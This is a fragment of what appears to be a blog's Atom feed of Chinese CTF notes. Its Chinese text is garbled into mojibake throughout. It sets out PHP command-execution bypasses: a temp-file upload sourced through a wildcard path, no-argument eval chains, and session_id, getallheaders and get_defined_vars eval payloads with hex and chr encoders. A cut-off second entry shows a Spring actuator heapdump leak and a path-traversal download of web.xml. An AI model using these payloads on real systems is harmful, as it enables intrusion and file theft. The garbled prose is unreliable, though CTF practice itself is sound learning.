class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://url/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        print(r.<span class="built_in">text</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚ç”±äºå­—æ¯æ•°å­—è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æ‰€æœ‰çš„å­—æ¯æ•°å­—éƒ½ç”¨?é€šé…ç¬¦ä»£æ›¿</p><p><strong>å…³äºæ­£åˆ™éƒ¨åˆ†</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br></pre></td></tr></table></figure><p>æ ¹æ®è§‚å¯Ÿï¼Œæ–‡ä»¶çš„æœ€åä¸€ä½å¿…å®šä¸ºå¤§å†™å­—æ¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™å¼ºåˆ¶åŒ¹é…å¤§å†™å­—ç¬¦å¢åŠ æˆåŠŸå‡ ç‡ï¼Œè¯¦è§å¼€å¤´asciiç è¡¨</p><p><strong>å…³äº.</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. filename</span><br></pre></td></tr></table></figure><p>ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚å½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™. fileçš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfilenameæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç”¨.æ¥æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶</p><p>å‚è€ƒè¯·æ±‚åŒ…</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?shell<span class="operator">=</span>?&gt;&lt;?<span class="operator">=</span>`.+/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f[<span class="variable">%40</span>-[]`<span class="variable">%3</span>b?&gt; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.210</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span><span class="comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line">Accept: text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml<span class="comment">;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN<span class="punctuation">,</span>zh<span class="comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">Content-Type:multipart/form-data<span class="comment">;boundary=--------123</span></span><br><span class="line">Accept-Encoding: gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">109</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-123</span></span><br><span class="line">Content-Disposition:form-data<span class="comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">---------<span class="number">-123</span>--</span><br></pre></td></tr></table></figure><h4 id="æœ‰æˆ–æ— å‚æ•°rce">æœ‰æˆ–æ— å‚æ•°rce</h4><p>æ‰€è°“æ— å‚æ•°rceå°±æ˜¯åˆ©ç”¨å„ç§å·²å®šä¹‰å‡½æ•°çš„å¤æ‚æ­é…ï¼Œåœ¨evalå‘½ä»¤æ‰§è¡Œçš„æ¡ä»¶ä¸‹æˆåŠŸæ„é€ æˆ‘ä»¬æ‰€éœ€çš„æ¶æ„ä»£ç çš„æ“ä½œã€‚ä¾‹å¦‚ä¸‹æ–¹ç®€ä»‹è¡¨æ ¼ä¸­çš„æœ€åä¸€æ¡ä»£ç ä¸²ã€‚</p><p>ç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¸¸è§å‡½æ•°åŠç®€ä»‹">å¸¸è§å‡½æ•°åŠç®€ä»‹</h5><table><thead><tr><th>å‡½æ•°</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>include()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>require()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>include_once()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>require_once()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>foreach($a as $x =&gt; $y)</td><td>$aä¸ºæ•°ç»„,å°†æ•°ç»„åå’Œå€¼å¾ªç¯èµ‹å€¼ç»™$xå’Œ$y</td></tr><tr><td>exit($a)</td><td>è¾“å‡º$aå¹¶é€€å‡ºå½“å‰è„šæœ¬</td></tr><tr><td>show_source()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>file_get_contents()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>highlight_file()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>readfile()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>var_dump()</td><td>æ‰“å°æ•°ç»„ï¼Œæ˜¾ç¤ºæ–‡ä»¶å</td></tr><tr><td>printf()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>next()</td><td>æ•°ç»„æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä½</td></tr><tr><td>array_reverse()</td><td>æ•°ç»„ä½ç½®å‰åè°ƒè½¬</td></tr><tr><td>show_source(next(array_reverse(scandir(current(localeconv())))))</td><td>è¾“å‡ºå½“å‰ç›®å½•å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶å†…å®¹</td></tr><tr><td>localeconv()</td><td>è¯¦ç»†çš„è‡ªå·±æœï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªæ˜¯å°æ•°ç‚¹å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥ç”¨current()æå–ä¸€ä¸ª.</td></tr><tr><td>current()æˆ–pos()</td><td>æå–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼</td></tr><tr><td>scandir()</td><td>æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶</td></tr><tr><td>scandir(current(localeconv()))</td><td>æŸ¥çœ‹ç›®å½•</td></tr><tr><td>var_dump(scandir(current(localeconv())))</td><td>è¾“å‡ºç›®å½•</td></tr><tr><td>array_flip()</td><td>äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„</td></tr><tr><td>array_rand()</td><td>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</td></tr><tr><td>end()</td><td>å–å‡ºæ•°ç»„ä¸­çš„æœ€åä¸€ä½</td></tr><tr><td>chdir()</td><td>ç›®å½•è·³è½¬ï¼Œä¾‹å¦‚chdir(â€˜â€¦â€™)å°±æ˜¯è·³è½¬åˆ°ä¸Šçº§ç›®å½•</td></tr><tr><td>get_defined_vars()</td><td>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼ˆå…¨å±€å˜é‡ï¼‰</td></tr><tr><td>dirname()</td><td>è¿”å›å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œå°±æ˜¯pwd</td></tr><tr><td>getcwd()</td><td>è¿”å›å½“å‰çš„å·¥ä½œç›®å½•</td></tr><tr><td>getallheaders()</td><td>è¿”å›æ‰€æœ‰çš„è¯·æ±‚å¤´æ•°ç»„</td></tr><tr><td>getenv()</td><td>php7.1ç‰ˆæœ¬ä»¥åæ‰èƒ½ä½¿ç”¨ï¼Œè·å–ç¯å¢ƒå˜é‡</td></tr><tr><td>time()</td><td>è¿”å›å½“å‰çš„Unixæ—¶é—´æˆ³</td></tr><tr><td>localtime()</td><td>å–å¾—æœ¬åœ°æ—¶é—´</td></tr><tr><td>localtime(time())</td><td>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ0-60ä¹‹é—´</td></tr><tr><td>__halt_compiler();</td><td>åœæ­¢å¯¹å½“å‰è„šæœ¬çš„ç¼–è¯‘ï¼Œå¯ç”¨äºå»æ‰åè¾¹æ²¡ç”¨çš„å­—ç¬¦ä¸²</td></tr><tr><td>pos()</td><td>å–å‡ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </td></tr><tr><td>print_r(scandir(next(scandir(getcwd()))));</td><td>è¾“å‡ºä¸Šçº§ç›®å½•</td></tr><tr><td>print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv()))))));</td><td>èµŒç‹—æ“ä½œï¼Œéšæœºè¯»å½“å‰ç›®å½•æ–‡ä»¶</td></tr></tbody></table><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure><p><strong>è¯»å–å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">end</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">current</span>(<span class="title">array_reverse</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>éšæœºè¿”å›å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">highlight_file</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))));</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ä¸Šçº§ç›®å½•</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">chdir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())))))))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">phpversion</span>())))))))))))))));</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶å</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">strrev</span>(<span class="title">crypt</span>(<span class="title">serialize</span>(<span class="title">array</span>())))))));</span></span><br></pre></td></tr></table></figure><h5 id="session-id">session_id</h5><p>é€šè¿‡å¼€å¯sessionï¼Œæ„é€ æ¶æ„sessionå€¼è¿›è€Œæ‰§è¡Œä»»æ„æ¶æ„ä»£ç ï¼Œæ„é€ è„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;phpinfo();&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¶æ„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><p>æ¶æ„sessionå€¼</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">phpsessid</span><span class="operator">=</span><span class="number">706870696</span>e666f28293b</span><br></pre></td></tr></table></figure><h5 id="getallheaders">getallheaders</h5><p>ç¤ºä¾‹ä»£ç </p><p>æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="built_in">array</span><span class="constructor">_pop(<span class="params">getallheaders</span>()</span>));</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„array_popæ˜¯å¼¹å‡ºhttpå¤´çš„æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//getallheaders()ä¼šè·å–æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯çš„ä¸€ä¸ªæ•°ç»„</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚å¤´:</span><br><span class="line">å› ä¸ºå¾—æ˜¯åœ¨æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥ç”¨å­—æ¯è®©ä»–æ’åˆ°æœ€å,ä¾‹å¦‚ï¼š</span><br><span class="line">ZZZZZ=phpinfo();</span><br><span class="line"></span><br><span class="line">æˆ–è€…ä½¿ç”¨</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">pos</span>(<span class="keyword">next</span>(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225738166.png" alt="image-20240123225738166"></p><p>æ³¨æ„çœ‹ï¼Œæ­¤æ—¶æˆ‘ä»¬é€šè¿‡printæˆåŠŸè¾“å‡ºäº†getallheadersçš„æ•°ç»„ï¼Œå¹¶æ„é€ äº†æ¶æ„è¯·æ±‚å¤´ZZZZZZï¼Œçœ‹å›¾å¯å¾—å…¶ä½äºæœ€åä¸€ä½</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225838387.png" alt="image-20240123225838387"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡endå‡½æ•°æˆåŠŸæå–åˆ°äº†æˆ‘ä»¬æ„é€ çš„ZZZZZçš„å€¼</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225922913.png" alt="image-20240123225922913"></p><p>å°†printæ¢æˆevalå³å¯å‘ç°æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†phpinfo</p><h5 id="get-defined-vars">get_defined_vars</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·å–å…¨å±€å˜é‡$_POST   $_GET    $_FILE    $_COOKIE</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225218898.png" alt="image-20240123225218898"></p><p>ç”±å›¾å¯å¾—ï¼Œæˆ‘ä»¬è·å–äº†æ‰€æœ‰çš„å…¨å±€å˜é‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225346696.png" alt="image-20240123225346696"></p><p>è§‚å¯Ÿè¿™å¼ å›¾ï¼Œæˆ‘åˆ©ç”¨äº†ä¸¤ä¸ªposæˆåŠŸæå–å‡ºäº†æˆ‘ä»¬æ¶æ„æ„é€ çš„123è¿™ä¸€å˜é‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225447536.png" alt="image-20240123225447536"></p><p>æ­¤æ—¶æˆ‘å°†printæ¢æˆäº†systemï¼Œå†å°†æ¶æ„æ„é€ çš„123æ¢æˆäº†ç³»ç»Ÿå‘½ä»¤lsï¼Œå‘åŒ…åå³å¯å‘ç°æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†lsç³»ç»Ÿå‘½ä»¤</p><h4 id="ç»•è¿‡ç®€ä»‹">ç»•è¿‡ç®€ä»‹</h4><p>evalç±»å’Œsystemç±»å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡å¤§åŒå°å¼‚ï¼Œæ­¤å¤„é¢å¤–æä¾›ä¸¤ä¸ªä»…åœ¨evalç±»ç”Ÿæ•ˆçš„è„šæœ¬ï¼Œå…¶æœ¬è´¨ä¸ºphpçš„å­—ç¬¦è§£ææœºåˆ¶å’Œphpçš„å‡½æ•°åˆ©ç”¨ï¼Œä»¥ä¸‹å¯ç”¨äºç»•è¿‡ç‰¹æ®Šå­—ç¬¦æ®µçš„è¿‡æ»¤ï¼Œé€‚ç”¨äºshow_sourceç­‰å¤šç§2.2.2ä¸­çš„æ˜¾ç¤ºå’ŒåŒ…å«æ–‡ä»¶å‡½æ•°çš„å‚æ•°æ„é€ </p><p><strong>1.16è¿›åˆ¶ç»•è¿‡&quot;\x77\x61\x66\x2e\x70\x68\x70&quot;ï¼Œå¤–é¢å¿…é¡»ä¸ºåŒå¼•å·</strong></p><p>16è¿›åˆ¶çš„æ„é€ è„šæœ¬</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">original_string</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="title">while</span>(<span class="variable">original_string</span><span class="variable">!</span>=<span class="string">&#x27;end&#x27;</span>):</span></span><br><span class="line"><span class="function">    <span class="variable">original_string</span> = <span class="title">input</span>()</span></span><br><span class="line">    <span class="variable">hex_representation</span> = <span class="string">&quot;\\x&quot;</span>.join(<span class="string">&quot;&#123;:02x&#125;&quot;</span>.format(<span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="variable">char</span>)) <span class="variable">for</span> <span class="variable">char</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">original_string</span>)</span></span><br><span class="line">    <span class="variable">final_result</span> = <span class="string">&quot;\\x&quot;</span> + <span class="variable">hex_representation</span></span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">final_result</span>)</span></span><br></pre></td></tr></table></figure><p><strong>2.chrå‡½æ•°ç»•è¿‡chr(119).chr(97).chr(102).chr(46).chr(112).chr(104).chr(112)</strong></p><p>chrçš„æ„é€ è„šæœ¬</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def convert_to_ascii_special(<span class="keyword">text</span>):</span><br><span class="line">    ascii_special = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">char</span> <span class="keyword">in</span> <span class="keyword">text</span>:</span><br><span class="line">        ascii_code = ord(<span class="keyword">char</span>)</span><br><span class="line">        ascii_special += <span class="string">&#x27;chr(&#123;&#125;).&#x27;</span>.<span class="built_in">format</span>(ascii_code)</span><br><span class="line">    ascii_special = ascii_special[:<span class="number">-1</span>]  <span class="comment"># å»é™¤æœ€åä¸€ä¸ªåŠ å·</span></span><br><span class="line">    <span class="literal">return</span> ascii_special</span><br><span class="line"></span><br><span class="line">user_input=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(user_input!=<span class="string">&#x27;end&#x27;</span>):</span><br><span class="line">    user_input = input(<span class="string">&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„å­—ç¬¦ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">result</span> = convert_to_ascii_special(user_input)</span><br><span class="line">    print(<span class="built_in">result</span>)</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/qq_56815564/article/details/130279662">https://blog.csdn.net/qq_56815564/article/details/130279662</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/kali_Ma/article/details/122544274">https://blog.csdn.net/kali_Ma/article/details/122544274</a></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>0xGame WEEK4 javaå…¨å®¶æ¡¶</title>
    <link href="https://bowuchuling.github.io/posts/654uyiuw0.html"/>
    <id>https://bowuchuling.github.io/posts/654uyiuw0.html</id>
    <published>2023-10-26T07:56:22.585Z</published>
    <updated>2024-04-04T18:18:25.729Z</updated>
    
    <content type="html"><![CDATA[<h1>0xGame WEEK4 javaå…¨å®¶æ¡¶</h1><h2 id="Week-4-spring">[Week 4] spring</h2><p>æ ¹æ®æç¤ºä¸ºspringbootçš„actuatoræœªæˆæƒè®¿é—®æ¼æ´ï¼Œä¸‹è½½æ•æ„Ÿæ–‡ä»¶heapdump</p><p>ctfscript</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JDumpSpider-1.1-SNAPSHOT-full.jar </span>heapdump</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231025213944755.png" alt="image-20231025213944755"></p><h2 id="Week-4-auth-bypass">[Week 4] auth_bypass</h2><p>ç»•è¿‡å§¿åŠ¿ï¼š</p><p>hackbarï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span></span><br></pre></td></tr></table></figure><p>burpsuiteï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/./</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½äº†ï¼Œé¦–å…ˆå°è¯•ä¸‹è½½æ•æ„Ÿæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 